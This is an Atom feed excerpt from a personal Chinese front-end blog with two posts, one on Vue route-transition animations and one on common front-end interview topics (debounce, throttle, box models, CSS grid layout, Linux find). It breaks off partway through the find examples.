<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pimi&#39;s Blog</title>
  
  <subtitle>A lazy youth, a lousy age.</subtitle>
  <link href="/blog/atom.xml" rel="self"/>
  
  <link href="http://pimichen.com/blog/"/>
  <updated>2019-06-26T16:00:00.000Z</updated>
  <id>http://pimichen.com/blog/</id>
  
  <author>
    <name>Pimi Chen</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vue利用transition实现路由切换仿APP效果</title>
    <link href="http://pimichen.com/blog/vue/vue%E5%88%A9%E7%94%A8transition%E5%AE%9E%E7%8E%B0%E8%B7%AF%E7%94%B1%E5%88%87%E6%8D%A2%E4%BB%BFAPP%E6%95%88%E6%9E%9C.html"/>
    <id>http://pimichen.com/blog/vue/vue利用transition实现路由切换仿APP效果.html</id>
    <published>2019-06-26T16:00:00.000Z</published>
    <updated>2019-06-26T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>在使用iOS APP时，我们经常能看见原生的切换效果体验非常顺滑。切换下一页时，动画从右往左。返回上一页时，动画从左往右。</p><p>使用vue的transition过渡动画也可以实现这一效果，效果图如下：</p><p><img src="../images/vue/vue-transition.gif"></p><p>router/index.js源码如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参考：https://blog.csdn.net/bbsyi/article/details/78195378</span></span><br><span class="line"><span class="comment">// 给Router扩展一个goBack方法，需要后退是调用this.$router.goBack()</span></span><br><span class="line">Router.prototype.goBack = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.goNext = <span class="number">0</span> <span class="comment">// 扩展一个变量记录后退</span></span><br><span class="line">  <span class="keyword">this</span>.go(<span class="number">-1</span>) <span class="comment">// 后退</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Vue.use(Router)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Router(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    ...firstEntries, <span class="comment">// 略</span></span><br><span class="line">    ...homeEntries,</span><br><span class="line">    ...discoverEntries,</span><br><span class="line">    ...orderEntries,</span><br><span class="line">    ...userEntries,</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">'*'</span>,</span><br><span class="line">      redirect: &#123;</span><br><span class="line">        name: <span class="string">'Home'</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>APP.vue源码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=<span class="string">"app"</span>&gt;</span><br><span class="line">    &lt;rFlexFixed&gt;</span><br><span class="line">      &lt;rTitlebar slot=<span class="string">"header"</span> theme=<span class="string">"a"</span> :title=<span class="string">"currentRouteInfo.meta.title"</span> @onback=<span class="string">"goBack"</span> v-if=<span class="string">"showBar"</span>&gt;&lt;/rTitlebar&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class=<span class="string">"main-content"</span>&gt;</span><br><span class="line">        &lt;transition :name=<span class="string">"transitionName"</span> :mode=<span class="string">"modeName"</span>&gt;</span><br><span class="line">          &lt;router-view class=<span class="string">"page-wrap"</span>/&gt;</span><br><span class="line">        &lt;/transition&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;pFooter slot=<span class="string">"footer"</span> :currentRouteName=<span class="string">"currentRouteInfo.name"</span> v-if=<span class="string">"!showBar"</span>&gt;&lt;/pFooter&gt;</span><br><span class="line">    &lt;/rFlexFixed&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import pFooter from <span class="string">'@/components/pFooter'</span></span><br><span class="line"><span class="built_in">export</span> default &#123;</span><br><span class="line">  name: <span class="string">'App'</span>,</span><br><span class="line">  components: &#123;</span><br><span class="line">    pFooter</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">data</span></span> () &#123;</span><br><span class="line">    <span class="built_in">return</span> &#123;</span><br><span class="line">      showBar: <span class="literal">false</span>, // 是否显示titleBar</span><br><span class="line">      currentRouteInfo: &#123;&#125;, // 当前页的信息</span><br><span class="line">      transitionName: <span class="string">''</span>,</span><br><span class="line">      modeName: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    <span class="string">'$route'</span> (to, from)  &#123;</span><br><span class="line">      this.showBar = ![<span class="string">'Home'</span>, <span class="string">'Discover'</span>, <span class="string">'Order'</span>, <span class="string">'User'</span>].includes(to.name)</span><br><span class="line">      this.currentRouteInfo = to</span><br><span class="line"></span><br><span class="line">      // 控制过渡动效</span><br><span class="line">      <span class="keyword">if</span> (from.fullPath === <span class="string">'/'</span> || to.params.tab) &#123; // 首次载入和tab间切换</span><br><span class="line">        this.transitionName = <span class="string">'router-fade'</span></span><br><span class="line">        this.modeName = <span class="string">'out-in'</span> // 控制一个页面先离开，另一个页面再进入</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!this.<span class="variable">$router</span>.goNext) &#123; // 后退</span><br><span class="line">        this.transitionName = <span class="string">'router-out'</span></span><br><span class="line">        this.modeName = <span class="string">''</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; // 前进</span><br><span class="line">        this.transitionName = <span class="string">'router-in'</span></span><br><span class="line">        this.modeName = <span class="string">''</span></span><br><span class="line">      &#125;</span><br><span class="line">      this.<span class="variable">$router</span>.goNext = 1 // 默认为前进</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    <span class="function"><span class="title">goBack</span></span> () &#123;</span><br><span class="line">      this.<span class="variable">$router</span>.goBack()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=<span class="string">"scss"</span>&gt;</span><br><span class="line"><span class="comment">#app &#123;</span></span><br><span class="line">  font-family: <span class="string">'Avenir'</span>, Helvetica, Arial, sans-serif;</span><br><span class="line">  -webkit-font-smoothing: antialiased;</span><br><span class="line">  -moz-osx-font-smoothing: grayscale;</span><br><span class="line">  text-align: center;</span><br><span class="line">  color: <span class="comment">#2c3e50;</span></span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  .main-content&#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    position: relative;</span><br><span class="line">  &#125;</span><br><span class="line">  .page-wrap&#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left: 0;</span><br><span class="line">    top: 0;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    overflow-y: scroll;</span><br><span class="line">    &amp;::-webkit-scrollbar&#123;display: none;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 主导航切换</span><br><span class="line">// 淡入淡出动画</span><br><span class="line">.router-fade-enter-active, .router-fade-leave-active &#123;</span><br><span class="line">  transition: opacity .3s ease-out;</span><br><span class="line">&#125;</span><br><span class="line">.router-fade-enter, .router-fade-leave-active &#123;</span><br><span class="line">  opacity: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 二级页面左右切换</span><br><span class="line">// router-out表示返回上一页（右到左），router-in表示前进下一页（左到右）</span><br><span class="line">.router-in-enter-active,</span><br><span class="line">.router-in-leave-active,</span><br><span class="line">.router-out-enter-active,</span><br><span class="line">.router-out-leave-active&#123;</span><br><span class="line">  transition: all 0.3s ease-out;</span><br><span class="line">&#125;</span><br><span class="line">.router-in-leave-active,</span><br><span class="line">.router-out-enter&#123;</span><br><span class="line">  opacity: 0;</span><br><span class="line">  transform: translate3d(-100%, 0, 0);</span><br><span class="line">&#125;</span><br><span class="line">.router-in-enter,</span><br><span class="line">.router-out-leave-active&#123;</span><br><span class="line">  opacity: 0;</span><br><span class="line">  transform: translate3d(100%, 0, 0);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p><p>主导航切换使用fade效果，二级页面间切换使用左右切换效果。</p><p>本例中，我们将titleBar放置在了APP.vue，对于实际的项目，可能需要将titleBar放置的页面中，便于更好的控制titleBar</p>]]></content>
    
    <summary type="html">
    
      vue利用transition实现路由切换仿APP效果
    
    </summary>
    
    
      <category term="Vue" scheme="http://pimichen.com/blog/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>前端常见的面试题</title>
    <link href="http://pimichen.com/blog/other/%E5%89%8D%E7%AB%AF%E5%B8%B8%E8%A7%81%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98.html"/>
    <id>http://pimichen.com/blog/other/前端常见的面试题.html</id>
    <published>2019-04-28T16:00:00.000Z</published>
    <updated>2019-04-28T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<!-- <div class="secret-box" id="secret-box">  <label for="input-secret" class="input-label">请输入密码：</label><input type="password" class="input-secret" id="input-secret" /><button class="submit-btn" id="submit-btn">提交</button></div> --><h2 id="常见的前端算法题"><a href="#常见的前端算法题" class="headerlink" title="常见的前端算法题"></a>常见的前端算法题</h2><blockquote><p>见：<a href="/javascript/前端算法集合.html">前端算法集合</a></p></blockquote><hr><h2 id="Event-Loop"><a href="#Event-Loop" class="headerlink" title="Event Loop"></a>Event Loop</h2><blockquote><p>参考：<a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">掘金 彻底弄懂 JavaScript 执行机制</a></p></blockquote><hr><h2 id="函数防抖和函数节流"><a href="#函数防抖和函数节流" class="headerlink" title="函数防抖和函数节流"></a>函数防抖和函数节流</h2><blockquote><p>参考：<a href="https://blog.csdn.net/qq_41000891/article/details/82733532" target="_blank" rel="noopener">csdn 前端性能——JS的防抖和节流</a><br>其他：<a href="https://segmentfault.com/a/1190000016261602" target="_blank" rel="noopener">segmentfault 7分钟理解JS的节流、防抖及使用场景</a></p></blockquote><p>函数节流和函数防抖，两者都是优化高频率执行js代码的一种手段。</p><h3 id="函数防抖-debounce"><a href="#函数防抖-debounce" class="headerlink" title="函数防抖 debounce"></a>函数防抖 debounce</h3><p><strong>函数防抖</strong> 是指当持续触发事件时，一定时间段内没有再触发事件，事件处理函数才会执行一次，如果设定的时间到来之前，又一次触发了事件，就重新开始延时。比如生活中的坐公交，就是一定时间内，如果有人陆续刷卡上车，司机就不会开车。只有别人没刷卡了，司机才开车。</p><p>如下例，持续触发scroll事件时，并不执行handle函数，当1000毫秒内没有触发scroll事件时，才会延时触发scroll事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, wait</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timeout = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(timeout !== <span class="literal">null</span>)</span><br><span class="line">            clearTimeout(timeout);</span><br><span class="line">        timeout = setTimeout(fn, wait);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 滚动事件</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, debounce(handle, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure><p>运行结果如下：<br><img src="../images/javascript/js_debounce.gif" title="函数防抖"></p><h3 id="函数节流-throttle"><a href="#函数节流-throttle" class="headerlink" title="函数节流 throttle"></a>函数节流 throttle</h3><p><strong>函数节流</strong> 是指当持续触发事件时，保证一定时间段内只调用一次事件处理函数。通俗解释就比如我们水龙头放水，阀门一打开，水哗哗的往下流，秉着勤俭节约的优良传统美德，我们要把水龙头关小点，最好是如我们心意按照一定规律在某个时间间隔内一滴一滴的往下滴。</p><p>如下例，持续触发scroll事件时，并不立即执行handle函数，每隔1000毫秒才会执行一次handle函数。</p><ul><li><p>时间戳方案</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> throttle = <span class="function"><span class="keyword">function</span>(<span class="params">func, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> prev = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        <span class="keyword">var</span> now = <span class="built_in">Date</span>.now();</span><br><span class="line">        <span class="keyword">if</span> (now - prev &gt;= delay) &#123;</span><br><span class="line">            func.apply(context, args);</span><br><span class="line">            prev = <span class="built_in">Date</span>.now();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, throttle(handle, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure></li><li><p>定时器方案</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> throttle = <span class="function"><span class="keyword">function</span>(<span class="params">func, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        <span class="keyword">if</span> (!timer) &#123;</span><br><span class="line">            timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                func.apply(context, args);</span><br><span class="line">                timer = <span class="literal">null</span>;</span><br><span class="line">            &#125;, delay);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, throttle(handle, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure></li><li><p>时间戳 + 定时器方案</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> throttle = <span class="function"><span class="keyword">function</span>(<span class="params">func, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> startTime = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> curTime = <span class="built_in">Date</span>.now();</span><br><span class="line">        <span class="keyword">var</span> remaining = delay - (curTime - startTime);</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">        clearTimeout(timer);</span><br><span class="line">        <span class="keyword">if</span> (remaining &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            func.apply(context, args);</span><br><span class="line">            startTime = <span class="built_in">Date</span>.now();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            timer = setTimeout(func, remaining);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, throttle(handle, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure></li></ul><p>运行结果如下：<br><img src="../images/javascript/js_throttle.gif" title="函数节流"></p><hr><h2 id="IE盒模型和标准盒模型"><a href="#IE盒模型和标准盒模型" class="headerlink" title="IE盒模型和标准盒模型"></a>IE盒模型和标准盒模型</h2><h3 id="IE盒模型"><a href="#IE盒模型" class="headerlink" title="IE盒模型"></a>IE盒模型</h3><p><img src="../images/css/css_box_model2.jpg" title="IE盒模型"><br>IE 盒模型包括 <code>margin</code>、<code>border</code>、<code>padding</code>、<code>content</code>，width 包含了 <code>content</code>、<code>border</code> 和 <code>pading</code>，即使用 <code>border</code>、<code>padding</code> 不会撑大 width。</p><h3 id="标准-W3C-盒模型"><a href="#标准-W3C-盒模型" class="headerlink" title="标准(W3C)盒模型"></a>标准(W3C)盒模型</h3><p><img src="../images/css/css_box_model1.jpg" title="标准盒模型"><br>W3C 盒子模型包括 <code>margin</code>、<code>border</code>、<code>padding</code>、<code>content</code>，width 不包含 <code>border</code> 和 <code>pading</code>，即使用 <code>border</code>、<code>padding</code> 会撑大 width。</p><p>例如，一个元素的样式如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>则 <strong>W3C 盒模型</strong>下：<br>盒模型占用的宽度为：<code>20*2 + 10*2 + 5*2 + 200 = 270px;</code><br>盒子实际宽度为：<code>10*2 + 5*2 + 200 = 230px;</code></p><p><strong>IE 盒模型</strong>下：<br>盒模型占用的宽度为：<code>20*2 + 200 = 240px;</code><br>盒子实际宽度为：<code>200px;</code></p><p>实际开发过程中，我们经常会使用 <code>box-sizing</code> 来改变盒模型，常见的有：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: content-box; <span class="comment">/* 默认W3C盒模型，width只极算content */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 实际开发过程中会经常使用下面这种 */</span></span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box; <span class="comment">/* 使用IE盒模型，width计算到border，这种模式下先固定宽度，然后padding和border不会对元素产生影响 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><hr><h2 id="css-实现响应式的九宫格布局"><a href="#css-实现响应式的九宫格布局" class="headerlink" title="css 实现响应式的九宫格布局"></a>css 实现响应式的九宫格布局</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box2"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box3"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box4"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box5"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box6"</span>&gt;</span>6<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box7"</span>&gt;</span>7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box8"</span>&gt;</span>8<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box9"</span>&gt;</span>9<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">* &#123; <span class="attribute">padding</span>: <span class="number">0</span>; <span class="attribute">margin</span>: <span class="number">0</span>; <span class="attribute">box-sizing</span>: border-box; &#125;</span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">100px</span>; <span class="comment">/* 左右各间距100px */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.main</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">33.33%</span>;</span><br><span class="line">  <span class="comment">/* padding-bottom: 33.33%; */</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">16.67%</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#E78326</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">3%</span>;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 内部div增加居中的文字 */</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="linux-查找文件的命令"><a href="#linux-查找文件的命令" class="headerlink" title="linux 查找文件的命令"></a>linux 查找文件的命令</h2><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>基本格式：<code>find path expression</code></p><ol><li>按照文件名查找<ul><li><code>find / -name httpd.conf</code>　　#在根目录下查找文件httpd.conf，表示在整个硬盘查找</li><li><code>find /etc -name httpd.conf</code>　　